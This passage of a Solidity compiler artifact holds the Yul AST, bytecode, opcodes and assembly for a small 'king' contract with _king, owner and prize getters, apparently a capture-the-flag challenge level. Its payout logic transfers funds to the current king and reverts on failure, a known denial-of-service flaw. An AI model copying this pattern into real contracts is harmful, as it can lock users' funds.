																	"src": "766:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "738:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "748:7:1",
														"type": ""
													}
												],
												"src": "711:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "858:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "868:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "883:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "890:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "879:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "879:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "868:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "840:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "850:7:1",
														"type": ""
													}
												],
												"src": "813:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "990:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1000:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1011:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1000:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "972:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "982:7:1",
														"type": ""
													}
												],
												"src": "945:77:1"
											}
										]
									},
									"contents": "{\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100385760003560e01c806329cc6d6f146101595780638da5cb5b14610184578063e3ac5d26146101af57610154565b36610154576001543410158061009b5750600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b6100a457600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc349081150290604051600060405180830381858888f1935050505015801561010a573d6000803e3d6000fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034600181905550005b600080fd5b34801561016557600080fd5b5061016e6101da565b60405161017b919061024d565b60405180910390f35b34801561019057600080fd5b50610199610203565b6040516101a6919061024d565b60405180910390f35b3480156101bb57600080fd5b506101c4610229565b6040516101d19190610268565b60405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b61023881610283565b82525050565b610247816102b5565b82525050565b6000602082019050610262600083018461022f565b92915050565b600060208201905061027d600083018461023e565b92915050565b600061028e82610295565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600081905091905056fea2646970667358221220f7318525284d531aa033bf87a2940846543c74e2ea0cbab6f9646c3482c91ef864736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x29CC6D6F EQ PUSH2 0x159 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x184 JUMPI DUP1 PUSH4 0xE3AC5D26 EQ PUSH2 0x1AF JUMPI PUSH2 0x154 JUMP JUMPDEST CALLDATASIZE PUSH2 0x154 JUMPI PUSH1 0x1 SLOAD CALLVALUE LT ISZERO DUP1 PUSH2 0x9B JUMPI POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST PUSH2 0xA4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC CALLVALUE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x10A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE PUSH1 0x1 DUP2 SWAP1 SSTORE POP STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x165 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16E PUSH2 0x1DA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x17B SWAP2 SWAP1 PUSH2 0x24D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x190 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x199 PUSH2 0x203 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1A6 SWAP2 SWAP1 PUSH2 0x24D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C4 PUSH2 0x229 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D1 SWAP2 SWAP1 PUSH2 0x268 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH2 0x238 DUP2 PUSH2 0x283 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x247 DUP2 PUSH2 0x2B5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x262 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x22F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x27D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x23E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x28E DUP3 PUSH2 0x295 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xF7 BALANCE DUP6 0x25 0x28 0x4D MSTORE8 BYTE LOG0 CALLER 0xBF DUP8 LOG2 SWAP5 ADDMOD CHAINID SLOAD EXTCODECOPY PUSH21 0xE2EA0CBAB6F9646C3482C91EF864736F6C63430008 STOP STOP CALLER ",
							"sourceMap": "414:454:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;665:5;;652:9;:18;;:41;;;;688:5;;;;;;;;;;;674:19;;:10;:19;;;652:41;644:50;;;;;;709:4;;;;;;;;;;701:22;;:33;724:9;701:33;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;748:10;741:4;;:17;;;;;;;;;;;;;;;;;;773:9;765:5;:17;;;;414:454;;;;;794:71;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;474:20;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;452:17;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;794:71;832:7;855:4;;;;;;;;;;;848:11;;794:71;:::o;474:20::-;;;;;;;;;;;;;:::o;452:17::-;;;;:::o;7:118:1:-;94:24;112:5;94:24;:::i;:::-;89:3;82:37;72:53;;:::o;131:118::-;218:24;236:5;218:24;:::i;:::-;213:3;206:37;196:53;;:::o;255:222::-;;386:2;375:9;371:18;363:26;;399:71;467:1;456:9;452:17;443:6;399:71;:::i;:::-;353:124;;;;:::o;483:222::-;;614:2;603:9;599:18;591:26;;627:71;695:1;684:9;680:17;671:6;627:71;:::i;:::-;581:124;;;;:::o;711:96::-;;777:24;795:5;777:24;:::i;:::-;766:35;;756:51;;;:::o;813:126::-;;890:42;883:5;879:54;868:65;;858:81;;;:::o;945:77::-;;1011:5;1000:16;;990:32;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "151400",
								"executionCost": "61917",
								"totalCost": "213317"
							},
							"external": {
								"_king()": "1200",
								"owner()": "1214",
								"prize()": "1151"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 414,
									"end": 868,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 414,
									"end": 868,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 414,
									"end": 868,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 538,
									"end": 548,
									"name": "CALLER",
									"source": 0
								},
								{
									"begin": 530,
									"end": 535,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 530,
									"end": 535,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 530,
									"end": 548,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 530,
									"end": 548,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 530,
									"end": 548,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 530,
									"end": 548,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 530,
									"end": 548,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 564,
									"end": 574,
									"name": "CALLER",
									"source": 0
								},
								{
									"begin": 557,
									"end": 561,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 557,
									"end": 561,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 557,
									"end": 574,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 557,
									"end": 574,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 557,
									"end": 574,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 557,
									"end": 574,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 589,
									"end": 598,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 581,
									"end": 586,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 581,
									"end": 598,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 581,
									"end": 598,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 581,
									"end": 598,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 581,
									"end": 598,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 414,
									"end": 868,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 414,
									"end": 868,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 414,
									"end": 868,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 414,
									"end": 868,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 414,
									"end": 868,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 414,
									"end": 868,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 414,
									"end": 868,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220f7318525284d531aa033bf87a2940846543c74e2ea0cbab6f9646c3482c91ef864736f6c63430008000033",
									".code": [
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH",
											"source": 0,
											"value": "29CC6D6F"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH",
											"source": 0,
											"value": "8DA5CB5B"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH",
											"source": 0,
											"value": "E3AC5D26"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 665,
											"end": 670,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 665,
											"end": 670,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 652,
											"end": 661,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 652,
											"end": 670,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 652,
											"end": 670,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 652,
											"end": 693,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 652,
											"end": 693,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 652,
											"end": 693,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 652,
											"end": 693,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 688,
											"end": 693,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 688,
											"end": 693,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 688,
											"end": 693,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 688,
											"end": 693,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 688,
											"end": 693,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 688,
											"end": 693,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 688,
											"end": 693,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 688,
											"end": 693,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 688,
											"end": 693,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 688,
											"end": 693,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 688,
											"end": 693,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 674,
											"end": 693,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 674,
											"end": 693,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 674,
											"end": 684,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 674,
											"end": 693,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 674,
											"end": 693,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 674,
											"end": 693,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 652,
											"end": 693,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 652,
											"end": 693,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 644,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 644,
											"end": 694,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 644,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 644,
											"end": 694,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 644,
											"end": 694,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 644,
											"end": 694,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 644,
											"end": 694,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 709,
											"end": 713,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 709,
											"end": 713,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 709,
											"end": 713,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 709,
											"end": 713,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 709,
											"end": 713,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 709,
											"end": 713,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 709,
											"end": 713,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 709,
											"end": 713,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 709,
											"end": 713,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 709,
											"end": 713,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 701,
											"end": 723,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 701,
											"end": 723,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 724,
											"end": 733,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 701,
											"end": 734,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 701,
											"end": 734,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 701,
											"end": 734,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 701,
											"end": 734,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 701,
											"end": 734,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 701,
											"end": 734,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 701,
											"end": 734,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 701,
											"end": 734,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 748,
											"end": 758,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 741,
											"end": 745,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 741,
											"end": 745,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 741,
											"end": 758,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 741,
